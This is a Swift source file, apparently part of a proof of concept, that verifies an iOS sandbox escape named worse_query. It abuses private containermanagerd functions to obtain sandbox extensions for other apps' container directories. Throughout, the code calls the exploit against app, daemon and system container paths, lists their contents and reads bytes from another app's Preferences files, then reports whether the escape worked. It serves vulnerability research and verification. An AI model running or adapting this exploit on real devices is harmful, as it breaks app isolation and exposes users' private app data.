//
//  Diagnostics.swift
//  Staged, read-only verification of worse_query.
//
//  Stage 1 checks the App Group entitlement (the exploit's hard prerequisite).
//  Stage 2 checks the private containermanagerd symbols.
//  Stage 3 tries the escape against every path the PoC claims, with both flag
//  sets, and measures the before/after sandbox differential.
//  Stage 4 tries to read a real file from another app container.
//

import Foundation

enum Diagnostics {

    struct Target {
        let label: String
        let path: String
        let deep: Bool
    }

    private static let targets: [Target] = [
        Target(label: "AppGroup root",
               path: "/private/var/mobile/Containers/Shared/AppGroup", deep: true),
        Target(label: "App containers",
               path: "/private/var/mobile/Containers/Data/Application", deep: true),
        Target(label: "InternalDaemon containers",
               path: "/private/var/mobile/Containers/Data/InternalDaemon", deep: true),
        Target(label: "PluginKitPlugin containers",
               path: "/private/var/mobile/Containers/Data/PluginKitPlugin", deep: true),
        Target(label: "SystemGroup (iOS 27)",
               path: "/private/var/containers/Shared/SystemGroup", deep: true),
        Target(label: "System data (iOS 27)",
               path: "/private/var/containers/Data/System", deep: false),
    ]

    static func run(group: String) -> String {
        var lines: [String] = []
        let log: (String) -> Void = { lines.append($0) }

        let v = ProcessInfo.processInfo.operatingSystemVersion
        let version = "\(v.majorVersion).\(v.minorVersion).\(v.patchVersion)"
        let build = Bundle.main.infoDictionary?["CFBundleVersion"] as? String ?? "?"

        log("worse_query verification harness")
        log("iOS \(version) | \(deviceModel())")
        log("app \(Bundle.main.bundleIdentifier ?? "?") (\(build))")
        log("date \(ISO8601DateFormatter().string(from: Date()))")
        log("")

        // MARK: Stage 1 - App Group entitlement
        log("== Stage 1: App Group entitlement ==")
        guard !group.isEmpty else {
            log("[FAIL] WQAppGroup is empty in Info.plist")
            log("")
            log("VERDICT: FAIL (build misconfigured)")
            return lines.joined(separator: "\n")
        }
        log("[INFO] group identifier: \(group)")

        let fm = FileManager.default
        guard let groupURL = fm.containerURL(forSecurityApplicationGroupIdentifier: group) else {
            log("[FAIL] containerURL(forSecurityApplicationGroupIdentifier:) returned nil")
            log("       The com.apple.security.application-groups entitlement is missing,")
            log("       or this group is not included in the signing profile.")
            log("       The exploit cannot even reach containermanagerd in this state.")
            log("")
            log("VERDICT: FAIL (not testable: App Group entitlement missing)")
            return lines.joined(separator: "\n")
        }
        log("[PASS] group container: \(groupURL.path)")
        try? fm.createDirectory(at: groupURL.appendingPathComponent("Library"),
                                withIntermediateDirectories: true)

        // MARK: Stage 2 - private symbols
        log("")
        log("== Stage 2: private containermanagerd symbols ==")
        let symbolReport = wq_diag_symbol_report()
        if symbolReport.hasPrefix("OK") {
            log("[PASS] \(symbolReport)")
        } else {
            log("[FAIL] \(symbolReport)")
        }

        // MARK: Stage 3 - per-target escape
        log("")
        log("== Stage 3: sandbox extension per target ==")
        var handles = 0
        var listings = 0
        var deepReads = 0
        var preDenied = 0

        for (i, target) in targets.enumerated() {
            log("")
            log("[\(i + 1)/\(targets.count)] \(target.label)")
            log("    \(target.path)")

            var st = stat()
            let lst = lstat(target.path, &st)
            let lstErr = errno
            log("    lstat: \(lst == 0 ? "ok" : "fail errno=\(lstErr)")")

            var preErr: Int32 = 0
            let pre = wq_listdir(target.path, &preErr, 8)
            if pre == nil && (preErr == EPERM || preErr == EACCES) { preDenied += 1 }
            log("    before extension: \(pre != nil ? "listable (\(pre!.count)+ entries)" : "denied errno=\(preErr)")")

            var handle = worse_query(target.path, group, false, false)
            log("    worse_query(alt=false, create_dir=false) -> \(handle) \(code(handle))")

            if handle == -255 {
                handle = worse_query(target.path, group, false, true)
                log("    worse_query(alt=false, create_dir=true)  -> \(handle) \(code(handle))")
            }
            if handle < 0 {
                let alt = worse_query(target.path, group, true, false)
                log("    worse_query(alt=true,  create_dir=false) -> \(alt) \(code(alt))")
                if alt >= 0 { handle = alt }
            }

            if handle < 0 {
                log("    [FAIL] no extension for this target")
                continue
            }
            handles += 1

            var postErr: Int32 = 0
            let post = wq_listdir(target.path, &postErr, 16)
            if let post = post {
                listings += 1
                log("    [PASS] after extension: listable, \(post.count) entries")
                log("    sample: \(post.prefix(8).joined(separator: ", "))")
                if target.deep {
                    deepReads += deepProbe(root: target.path,
                                           children: Array(post.prefix(2)),
                                           group: group,
                                           log: log)
                }
            } else {
                log("    [WARN] extension granted but listing denied errno=\(postErr)")
            }

            worse_query_release(handle)
            log("    released handle \(handle)")
        }

        // MARK: Verdict
        log("")
        log("== VERDICT ==")
        log("extension handles granted: \(handles)/\(targets.count)")
        log("post-extension directory listings: \(listings)")
        log("cross-container child reads: \(deepReads)")
        log("targets denied before extension: \(preDenied)")

        if handles > 0 && (deepReads > 0 || listings > 0) {
            log("RESULT: PASS - the sandbox escape works on iOS \(version).")
            if preDenied > 0 && listings > 0 {
                log("PROOF: \(preDenied) path(s) denied before consuming became readable after.")
            }
        } else if handles > 0 {
            log("RESULT: PARTIAL - containermanagerd issued a token, but nothing was readable.")
        } else {
            log("RESULT: FAIL - no extension was issued.")
            log("        Either the bug is fixed on this build, the query flags/class changed,")
            log("        or the App Group is not provisioned correctly.")
        }
        log("")
        log("[NOTE] This harness is read-only. It only writes inside its own App Group.")
        return lines.joined(separator: "\n")
    }

    /// Consumes a per-container extension, then tries to read real container data.
    /// Mirrors what the original PoC does when it enumerates AppGroup children.
    private static func deepProbe(root: String,
                                  children: [String],
                                  group: String,
                                  log: (String) -> Void) -> Int {
        var reads = 0

        for child in children {
            let childPath = root + "/" + child

            // create_dir=true bypasses the lstat gate inside worse_query().
            let h = worse_query(childPath, group, false, true)
            if h < 0 {
                log("      child \(child): per-container extension failed \(h) \(code(h))")
                continue
            }

            let cid = wq_container_id(childPath) ?? "?"
            let meta = wq_container_metadata(childPath)
            let mid = (meta?["MCMMetadataIdentifier"] as? String) ?? "?"

            var prefErr: Int32 = 0
            let prefs = wq_listdir(childPath + "/Library/Preferences", &prefErr, 8)

            if let prefs = prefs, let first = prefs.first {
                var readErr: Int32 = 0
                if let data = wq_readfile(childPath + "/Library/Preferences/" + first,
                                          4096, &readErr) {
                    reads += 1
                    log("      child \(child): ext=ok id=\(cid) meta=\(mid) " +
                        "prefs=\(prefs.count) read=\(data.count)B")
                } else {
                    log("      child \(child): ext=ok id=\(cid) meta=\(mid) " +
                        "prefs=\(prefs.count) read errno=\(readErr)")
                }
            } else {
                var listErr: Int32 = 0
                let top = wq_listdir(childPath, &listErr, 8)
                log("      child \(child): ext=ok id=\(cid) meta=\(mid) " +
                    "prefs errno=\(prefErr) top=\(top?.count ?? -1)")
            }

            worse_query_release(h)
        }
        return reads
    }

    private static func code(_ h: Int64) -> String {
        switch h {
        case -1:   return "(-1: App Group container unavailable)"
        case -2:   return "(-2: dlopen/dlsym failed)"
        case -3:   return "(-3: container_query_create failed)"
        case -4:   return "(-4: symlink creation failed)"
        case -5:   return "(-5: query rejected by containermanagerd)"
        case -6:   return "(-6: kernel refused sandbox token)"
        case -255: return "(-255: target lstat failed)"
        default:   return h >= 0 ? "(valid extension handle)" : "(unknown)"
        }
    }

    private static func deviceModel() -> String {
        var uts = utsname()
        uname(&uts)
        return withUnsafePointer(to: &uts.machine) {
            $0.withMemoryRebound(to: CChar.self, capacity: 1) { String(cString: $0) }
        }
    }
}